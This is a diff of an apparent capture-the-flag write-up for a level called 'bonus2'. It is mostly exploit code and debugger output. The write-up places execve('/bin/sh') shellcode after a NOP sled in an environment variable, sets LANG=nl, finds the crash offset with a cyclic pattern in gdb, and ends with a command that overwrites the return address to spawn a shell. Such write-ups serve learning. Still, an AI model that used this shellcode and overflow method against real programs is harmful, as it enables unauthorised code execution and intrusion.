@@ -4,18 +4,15 @@ We're again using this [shellcode](https://shell-storm.org/shellcode/files/shell
 
 ```shell
 export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+export LANG=nl
 ```
 
 ```shell
-(gdb) r `python -c 'print 41 * "A"'` "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab" 
-Breakpoint 2, 0x0804851f in greetuser ()
-(gdb) next
-Single stepping until exit from function greetuser,
-which has no line number information.
+(gdb) r `python -c 'print 41 * "A"'` "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
 0x38614137 in ?? ()
 ```
-Using [a pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) we found that the offset it segfaults at is 23 (with LANG=nl)
+Using [a pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) we found that the offset it segfaults at is 23.
 
 ```shell
 ./bonus2 `python -c 'print 40 * "A"'` `python -c 'print 23 * "B" + "\x6c\xfd\xff\xbfa"'`
